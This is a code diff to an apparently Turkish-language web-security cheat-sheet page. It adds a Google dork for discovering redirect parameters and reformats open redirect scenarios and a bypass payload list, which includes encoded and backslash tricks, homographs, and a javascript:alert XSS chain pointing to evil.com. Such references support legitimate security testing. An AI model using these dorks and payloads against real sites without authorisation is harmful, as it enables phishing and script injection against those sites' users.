@@ -2699,7 +2699,7 @@ Body: { "email": "victim@target.com" }</pre>
         title: 'Open Redirect (Açık Yönlendirme) Zafiyeti',
         description: 'Kullanıcının kontrol ettiği bir parametre ile uygulamanın kullanıcıyı kötü amaçlı bir harici siteye yönlendirmesi.',
         sections: [
-          {
+          { 
             title: 'Özet Bilgi ve Kritik Etki',
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Etki:</strong> Phishing saldırıları, tarayıcıda XSS (<code>javascript:</code> protokolü ile), SSRF zafiyetine yol açan zincirleme saldırılar.</li>
@@ -2714,6 +2714,33 @@ Body: { "email": "victim@target.com" }</pre>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 3: Protokol Trick:</strong> Parametre değerine <code>//evil.com</code> veya <code>/\\/evil.com</code> verin. Filtre sadece "http" veya "https" kontrolü yapıyorsa bu atlatma çalışabilir.</li>
             </ul>`
           },
+
+          {
+            title: 'Google Dorking: Parametre Keşfi',
+            content: `
+              <p class="small">Hedef domaindeki tüm potansiyel yönlendirme noktalarını keşfetmek için bu "nükleer" dorku kullanın.</p>
+              
+              <div class="card" style="border: 1px solid rgba(139, 92, 246, 0.3); background: rgba(18, 15, 24, 0.8); position: relative; padding-top: 35px; overflow: hidden;">
+                  <div style="position: absolute; top: 12px; left: 15px; display: flex; gap: 6px;">
+                      <div style="width: 10px; height: 10px; border-radius: 50%; background: #ff5f56;"></div>
+                      <div style="width: 10px; height: 10px; border-radius: 50%; background: #ffbd2e;"></div>
+                      <div style="width: 10px; height: 10px; border-radius: 50%; background: #27c93f;"></div>
+                  </div>
+                  
+                  <div style="position: relative;">
+                      <pre style="margin:0; font-size:13px; color: #b38cff; background: transparent; white-space: pre-wrap; word-break: break-all; font-family: 'Fira Code', monospace; line-height: 1.5; padding: 5px;">site:example.com inurl:redir= | inurl:url= | inurl:redirect= | inurl:return= | inurl:next= | inurl:r= | inurl:view= | inurl:dest= | inurl:destination= | inurl:go= | inurl:to= | inurl:forward= | inurl:dispatch= | inurl:callback= | inurl:action= | inurl:checkout_url= | inurl:image_url= | inurl:file_url= | inurl:uri= | inurl:path= | inurl:continue= | inurl:window= | inurl:back= | inurl:navigation= | inurl:out= | inurl:site= | inurl:link= | url=http | redir=http | next=http</pre>
+                      
+                      <button class="copybtn" style="position:absolute; bottom: -5px; right: 0px; background: rgba(139, 92, 246, 0.2); padding: 5px 10px; border-radius: 4px; font-size: 11px;" onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText); this.innerText='Kopyalandı!'; setTimeout(()=>this.innerText='Kopyala', 2000)">Kopyala</button>
+                  </div>
+              </div>
+
+              <div class="card" style="border-left: 3px solid #ef4444; background: rgba(239, 68, 68, 0.05); margin-top: 15px;">
+                  <h4 style="font-size:13px; color:#ef4444; margin: 0 0 5px 0;">Pro Tip</h4>
+                  <p class="small" style="margin:0;">Sorgunun sonuna <code>-www</code> ekleyerek ana domaini eleyip subdomainleri (dev, staging, test) hedef alabilirsin.</p>
+              </div>
+            `
+          },
+
           {
             title: 'Bypass Teknikleri (Whitelist Atlatma)',
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
@@ -2723,119 +2750,119 @@ Body: { "email": "victim@target.com" }</pre>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Data/Javascript URI:</strong> <code>javascript:alert(document.domain)</code> veya <code>data:text/html;base64,...</code> deneyerek XSS'e çevirmeye çalışın.</li>
             </ul>`
           },
-{
-  title: 'Örnek Open Redirect Senaryoları',
-  content: `
-  <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
-      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
-          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">1. Protokol & Karakter Bypass</strong>
-          <span style="display:block;margin-bottom:8px;opacity:0.8;">"http://" kontrolünü atlatmak için çift eğik çizgi kullanımı.</span>
-          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">/login?url=//evil.com</pre>
-      </li>
+          {
+            title: 'Örnek Open Redirect Senaryoları',
+            content: `
+            <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+                    <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">1. Protokol & Karakter Bypass</strong>
+                    <span style="display:block;margin-bottom:8px;opacity:0.8;">"http://" kontrolünü atlatmak için çift eğik çizgi kullanımı.</span>
+                    <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">/login?url=//evil.com</pre>
+                </li>
 
-      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
-          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">2. HTTP Parameter Pollution (HPP)</strong>
-          <span style="display:block;margin-bottom:8px;opacity:0.8;">Aynı parametreyi iki kez kullanarak sunucu tarafındaki filtreyi şaşırtma.</span>
-          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?url=target.com&url=https://evil.com</pre>
-      </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+                    <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">2. HTTP Parameter Pollution (HPP)</strong>
+                    <span style="display:block;margin-bottom:8px;opacity:0.8;">Aynı parametreyi iki kez kullanarak sunucu tarafındaki filtreyi şaşırtma.</span>
+                    <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?url=target.com&url=https://evil.com</pre>
+                </li>
 
-      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
-          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">3. User-Info & Domain Trick</strong>
-          <span style="display:block;margin-bottom:8px;opacity:0.8;">"@" işaretini kullanarak gerçek siteyi kullanıcı adı gibi gösterip saldırganın domainine yönlendirme.</span>
-          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?next=https://target.com@evil.com</pre>
-      </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+                    <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">3. User-Info & Domain Trick</strong>
+                    <span style="display:block;margin-bottom:8px;opacity:0.8;">"@" işaretini kullanarak gerçek siteyi kullanıcı adı gibi gösterip saldırganın domainine yönlendirme.</span>
+                    <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?next=https://target.com@evil.com</pre>
+                </li>
 
-      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
-          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">4. Path Traversal & Slash</strong>
-          <span style="display:block;margin-bottom:8px;opacity:0.8;">Dizin değiştirme karakterleri kullanarak beyaz listedeki domainden dışarı çıkma.</span>
-          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?redirect=https://target.com/..//evil.com</pre>
-      </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+                    <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">4. Path Traversal & Slash</strong>
+                    <span style="display:block;margin-bottom:8px;opacity:0.8;">Dizin değiştirme karakterleri kullanarak beyaz listedeki domainden dışarı çıkma.</span>
+                    <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?redirect=https://target.com/..//evil.com</pre>
+                </li>
 
-      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
-          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">5. JavaScript URI (XSS Chain)</strong>
-          <span style="display:block;margin-bottom:8px;opacity:0.8;">Yönlendirmeyi doğrudan JavaScript kodu çalıştırmak için kullanma.</span>
-          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?url=javascript:alert(document.domain)</pre>
-      </li>
-  </ul>`
-},
-{
-  title: 'Gelişmiş Bypass Payload Listesi',
-  content: `
-  <div style="margin-bottom:16px;padding:12px;background:rgba(59, 130, 246, 0.15);border:1px solid rgba(59, 130, 246, 0.3);border-radius:8px;font-size:14px;color:#e2e8f0;display:flex;align-items:center;gap:10px;">
-      <span style="font-size:20px;">❓</span>
-      <div>
-          <strong>Nasıl Kullanılır?</strong>
-          <div style="opacity:0.8;font-size:13px;margin-top:2px;">
-              Aşağıdaki payloadlar, hedef parametrenin (örn: <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">?next=</code>, <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">?url=</code>, <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">...</code>) <strong>değeri</strong> olarak denenmelidir.
-          </div>
-      </div>
-  </div>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+                    <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">5. JavaScript URI (XSS Chain)</strong>
+                    <span style="display:block;margin-bottom:8px;opacity:0.8;">Yönlendirmeyi doğrudan JavaScript kodu çalıştırmak için kullanma.</span>
+                    <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?url=javascript:alert(document.domain)</pre>
+                </li>
+            </ul>`
+          },
+          {
+            title: 'Gelişmiş Bypass Payload Listesi',
+            content: `
+            <div style="margin-bottom:16px; padding:12px; background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.2); border-radius: 8px; font-size: 14px; color: #e2e8f0; display: flex; align-items: center; gap: 10px;">
+                <span style="font-size:20px;">❓</span>
+                <div>
+                    <strong>Nasıl Kullanılır?</strong>
+                    <div style="opacity:0.8;font-size:13px;margin-top:2px;">
+                        Aşağıdaki payloadlar, hedef parametrenin (örn: <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">?next=</code>, <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">?url=</code>, <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">...</code>) <strong>değeri</strong> olarak denenmelidir.
+                    </div>
+                </div>
+            </div>
 
-  <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-          <strong style="color:var(--muted);display:block;margin-bottom:8px;">1. Slash (/) ve Backslash (\\) Manipülasyonları</strong>
-          <div style="display:flex;flex-wrap:wrap;gap:5px;">
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">///evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\/\\/evil.com/</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/\\/\\/evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//\\\\evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/..\\\\/evil.com</code>
-          </div>
-      </li>
-      
-      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-          <strong style="color:var(--muted);display:block;margin-bottom:8px;">2. URL Encoding Teknikleri</strong>
-          <div style="display:flex;flex-wrap:wrap;gap:5px;">
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2F/evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%5Cevil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2f%2fevil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%09/evil.com (Tab)</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%20/evil.com (Space)</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%00/evil.com (Null)</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/%0d/evil.com (CRLF)</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">?url=target.com%40evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">?url=target.com%23evil.com</code>
-          </div>
-      </li>
+            <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">1. Slash (/) ve Backslash (\\) Manipülasyonları</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">///evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\/\\/evil.com/</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/\\/\\/evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//\\\\evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/..\\\\/evil.com</code>
+                    </div>
+                </li>
+                
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">2. URL Encoding Teknikleri</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2F/evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%5Cevil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2f%2fevil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%09/evil.com (Tab)</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%20/evil.com (Space)</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%00/evil.com (Null)</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/%0d/evil.com (CRLF)</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">?url=target.com%40evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">?url=target.com%23evil.com</code>
+                    </div>
+                </li>
 
-      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-          <strong style="color:var(--muted);display:block;margin-bottom:8px;">3. Nokta (.) ve Domain Doğrulama Hataları {Redirect Parametresini unutma!}</strong>
-          <div style="display:flex;flex-wrap:wrap;gap:5px;">
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com?evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com@evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://www.target.com.evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://evil.com/target.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://evil.com?target.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://target.com@evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com/°evil.com</code>
-          </div>
-      </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">3. Nokta (.) ve Domain Doğrulama Hataları {Redirect Parametresini unutma!}</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com?evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com@evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://www.target.com.evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://evil.com/target.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://evil.com?target.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://target.com@evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com/°evil.com</code>
+                    </div>
+                </li>
 
-      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-          <strong style="color:var(--muted);display:block;margin-bottom:8px;">4. Unicode ve IDN Homograph</strong>
-          <div style="display:flex;flex-wrap:wrap;gap:5px;">
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">evil。com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">evil%E3%80%82com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://ⓔⓥⓘⓛ.ⓒⓞⓜ</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil%00.com</code>
-          </div>
-      </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">4. Unicode ve IDN Homograph</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">evil。com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">evil%E3%80%82com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://ⓔⓥⓘⓛ.ⓒⓞⓜ</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil%00.com</code>
+                    </div>
+                </li>
 
-      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-          <strong style="color:var(--muted);display:block;margin-bottom:8px;">5. Protokol ve Parametre Manipülasyonu</strong>
-          <div style="display:flex;flex-wrap:wrap;gap:5px;">
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com&url=evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https;evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http:evil.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil%00.com</code>
-              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">&lt;&gt;//evil.com</code>
-          </div>
-      </li>
-  </ul>`
-}
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">5. Protokol ve Parametre Manipülasyonu</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com&url=evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https;evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http:evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil%00.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">&lt;&gt;//evil.com</code>
+                    </div>
+                </li>
+            </ul>`
+          }
         ]
       },
 
@@ -4397,9 +4424,7 @@ function showPage(pageId) {
             position: relative; 
             overflow: hidden; 
             background: rgba(1, 1, 1, 0.5); 
-            /* 0.3 değeri ile moru iyice kararttık, 1px ile de incelttik */
             border: 1px solid rgba(139, 92, 246, 0.3); 
-            /* Dış ışıma (glow) efektini de çok hafiflettik ki kaba durmasın */
             box-shadow: 0 0 10px rgba(139, 92, 246, 0.1); 
             padding: 40px; 
             margin-bottom: 30px; 
